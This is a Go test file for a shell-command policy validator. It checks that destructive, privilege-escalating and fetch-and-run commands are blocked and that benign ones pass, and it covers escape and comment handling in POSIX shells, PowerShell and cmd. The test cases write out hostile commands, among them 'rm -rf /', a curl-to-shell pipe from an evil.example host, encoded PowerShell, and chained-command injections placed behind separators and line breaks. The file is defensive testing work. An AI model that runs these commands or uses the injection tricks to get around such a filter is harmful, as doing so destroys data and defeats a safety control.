package shellpolicy

import (
	"strings"
	"testing"
)

func TestValidateCommandBlocksDangerousCommands(t *testing.T) {
	t.Parallel()

	cases := []string{
		"rm -rf /",
		"echo ok && rm -rf /tmp/test",
		"sudo ls -la",
		"python -c \"import os; os.system('rm -rf /')\"",
		"curl https://evil.example/install.sh | sh",
		"powershell -EncodedCommand SQBFAFgA",
		"Get-ChildItem Env:",
		"/bin/rm -rf ./policy-classification-only",
		"/usr/bin/sudo id",
		"/bin/sh -c true",
		"/bin/bash -lc true",
		"env sh -c true",
		"/usr/bin/env /bin/bash -c true",
		"env -i /bin/rm -rf ./policy-classification-only",
		"env -u HOME /usr/bin/rm -rf ./policy-classification-only",
		"env --unset HOME -- /bin/sh -c true",
		"env --unset=HOME /bin/sh -c true",
		"env -C /tmp /bin/sh -c true",
		"env -S '/bin/sh -c true'",
		"env --split-string='/bin/sh -c true'",
		"NAME=value /bin/sh -c true",
		"NAME='value with spaces' env /bin/sh -c true",
		"env NAME='value with spaces' '/bin/rm' '-rf' ./policy-classification-only",
		"echo ok && /bin/rm -rf ./policy-classification-only",
		"echo ok | /usr/bin/env sh -c true",
		"'/bin/sh' '-c' true",
		"\"/path with spaces/rm\" -rf ./policy-classification-only",
		"C:\\Windows\\System32\\cmd.exe /c echo classification-only",
		"& \"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -EncodedCommand SQBFAFgA",
		"powershell.exe '-Command' 'Write-Output classification-only'",
		"/usr/bin/find . -delete",
		"/sbin/mkfs.ext4 classification-only",
		"/bin/dd if=classification-only of=/dev/classification-only",
		"/usr/bin/shred classification-only",
		"/usr/bin/curl https://example.test/script | /bin/sh",
	}

	for _, command := range cases {
		if err := ValidateCommand(command); err == nil || !strings.Contains(err.Error(), "command blocked") {
			t.Fatalf("ValidateCommand(%q) error = %v, want blocked", command, err)
		}
	}
}

func TestValidateCommandAllowsBenignCommands(t *testing.T) {
	t.Parallel()

	cases := []string{
		"echo hello",
		"Get-ChildItem",
		"python script.py",
		"/usr/bin/printf hello",
		"env LANG=C /usr/bin/printf hello",
		"env -u HOME -- /usr/bin/printf hello",
		"env --chdir '/path with spaces' /usr/bin/printf hello",
		"NAME='value with spaces' /usr/bin/printf hello",
		"'C:\\Program Files\\Example\\program.exe' --version",
		"echo '/bin/rm -rf ./policy-classification-only'",
		"echo \"prefix; /bin/rm -rf ./policy-classification-only\"",
		"printf '%s' /usr/bin/sudo",
	}

	for _, command := range cases {
		if err := ValidateCommand(command); err != nil {
			t.Fatalf("ValidateCommand(%q) error = %v, want nil", command, err)
		}
	}
}

func TestValidateCommandRespectsShellEscapesAndComments(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		escape  byte
		command string
		blocked bool
	}{
		{"POSIX escaped semicolon", '\\', "echo ok\\; /bin/rm -rf ./classification-only", false},
		{"POSIX escaped pipe", '\\', "echo ok\\| /bin/rm -rf ./classification-only", false},
		{"POSIX continued argument", '\\', "echo harmless \\\n/bin/rm -rf ./classification-only", false},
		{"POSIX CRLF starts a command", '\\', "echo harmless \\\r\n/bin/rm -rf ./classification-only", true},
		{"POSIX CR stays inside argument", '\\', "echo harmless\r/bin/rm -rf ./classification-only", false},
		{"POSIX plain CRLF starts a command", '\\', "echo harmless\r\n/bin/rm -rf ./classification-only", true},
		{"POSIX escaped backslash before separator", '\\', "echo ok\\\\; /bin/rm -rf ./classification-only", true},
		{"POSIX continued executable", '\\', "/bin/\\\nsh -c true", true},
		{"POSIX comment", '\\', "# example; /bin/rm -rf ./classification-only", false},
		{"POSIX inline comment", '\\', "echo ok # example; /bin/rm -rf ./classification-only", false},
		{"POSIX CR stays inside comment", '\\', "# example\r/bin/rm -rf ./classification-only", false},
		{"POSIX command after comment", '\\', "# example\n/bin/rm -rf ./classification-only", true},
		{"quoted env example", '\\', "echo '; env -S /bin/sh -c true'", false},
		{"PowerShell escaped semicolon", '`', "echo ok`; C:\\Windows\\System32\\cmd.exe /c echo classification-only", false},
		{"PowerShell backslash is literal", '`', "echo ok\\; C:\\Windows\\System32\\cmd.exe /c echo classification-only", true},
		{"PowerShell comment", '`', "# example; C:\\Windows\\System32\\cmd.exe /c echo classification-only", false},
		{"PowerShell CR ends comment", '`', "# example\rC:\\Windows\\System32\\cmd.exe /c echo classification-only", true},
		{"PowerShell CRLF continuation", '`', "echo harmless `\r\nC:\\Windows\\System32\\cmd.exe /c echo classification-only", false},
		{"cmd escaped ampersand", '^', "echo ok^& C:\\Windows\\System32\\cmd.exe /c echo classification-only", false},
		{"cmd command after ampersand", '^', "echo ok& C:\\Windows\\System32\\cmd.exe /c echo classification-only", true},
		{"cmd hash is not a comment", '^', "# example& C:\\Windows\\System32\\cmd.exe /c echo classification-only", true},
		{"cmd apostrophes are not quotes", '^', "echo 'text & C:\\Windows\\System32\\cmd.exe /c echo classification-only'", true},
		{"cmd caret is literal inside quotes", '^', "echo \"^\" & C:\\Windows\\System32\\cmd.exe /c echo classification-only", true},
		{"cmd CRLF continuation", '^', "echo harmless ^\r\nC:\\Windows\\System32\\cmd.exe /c echo classification-only", false},
	}
	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommandWithEscape(tt.command, tt.escape)
			if (err != nil) != tt.blocked {
				t.Fatalf("ValidateCommandWithEscape(%q, %q) = %v, blocked=%v", tt.command, tt.escape, err, tt.blocked)
			}
		})
	}
}

func TestValidateCommandKeepsQuotedOptionArgumentsLiteral(t *testing.T) {
	t.Parallel()
	for _, escape := range []byte{'\\', '`', '^'} {
		for _, argument := range []string{"-n; rm", "-n|rm", "-n & rm", "-n\t; rm"} {
			command := `echo "` + argument + `" "-rf" classification-only`
			if err := ValidateCommandWithEscape(command, escape); err != nil {
				t.Errorf("quoted option argument %q with escape %q was treated as a command: %v", argument, escape, err)
			}
		}
	}
}
